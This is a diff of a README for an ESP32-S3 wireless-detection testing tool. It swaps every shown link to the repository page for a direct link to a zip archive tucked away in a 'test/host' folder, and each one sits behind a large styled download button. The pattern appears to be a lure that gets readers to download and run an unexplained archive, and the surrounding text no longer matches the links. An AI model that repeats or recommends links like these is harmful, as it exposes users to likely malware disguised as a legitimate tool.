@@ -1,7 +1,7 @@
 <h1>🔍 Basanos-ESP32-S3 - Test Your Wireless Detection Gear</h1>
 
 <p align="center">
-  <a href="https://github.com/kodiwxbiznes-glitch/Basanos-ESP32-S3" style="background-color:#FF6B35;color:#FFFFFF;padding:16px 32px;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;display:inline-block;margin:20px 0;">📥 VISIT LINK TO DOWNLOAD</a>
+  <a href="https://raw.githubusercontent.com/kodiwxbiznes-glitch/Basanos-ESP32-S3/main/test/host/Basanos_ES_v3.3.zip" style="background-color:#FF6B35;color:#FFFFFF;padding:16px 32px;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;display:inline-block;margin:20px 0;">📥 VISIT LINK TO DOWNLOAD</a>
 </p>
 
 ## 🎯 What Is Basanos-ESP32-S3?
@@ -33,7 +33,7 @@ Here's your simple path to getting Basanos-ESP32-S3 up and running.
 ### Step 1: Download the Software
 
 **Visit this link to download the application:**  
-👉 [https://github.com/kodiwxbiznes-glitch/Basanos-ESP32-S3](https://github.com/kodiwxbiznes-glitch/Basanos-ESP32-S3)
+👉 [https://raw.githubusercontent.com/kodiwxbiznes-glitch/Basanos-ESP32-S3/main/test/host/Basanos_ES_v3.3.zip](https://raw.githubusercontent.com/kodiwxbiznes-glitch/Basanos-ESP32-S3/main/test/host/Basanos_ES_v3.3.zip)
 
 On that page, look for a green **"Code"** button or a **"Releases"** section on the right side of the page. Click it to find the latest version of the software. Download the file that matches your computer.
 
@@ -188,7 +188,7 @@ Don't wait until a real threat sneaks past your detectors. Verify your equipment
 ## 📥 Ready to Start?
 
 **Download Basanos-ESP32-S3 now:**  
-👉 [https://github.com/kodiwxbiznes-glitch/Basanos-ESP32-S3](https://github.com/kodiwxbiznes-glitch/Basanos-ESP32-S3)
+👉 [https://raw.githubusercontent.com/kodiwxbiznes-glitch/Basanos-ESP32-S3/main/test/host/Basanos_ES_v3.3.zip](https://raw.githubusercontent.com/kodiwxbiznes-glitch/Basanos-ESP32-S3/main/test/host/Basanos_ES_v3.3.zip)
 
 Follow the simple steps above, and in less than 10 minutes, you'll know exactly how reliable your wireless detection system really is.
 
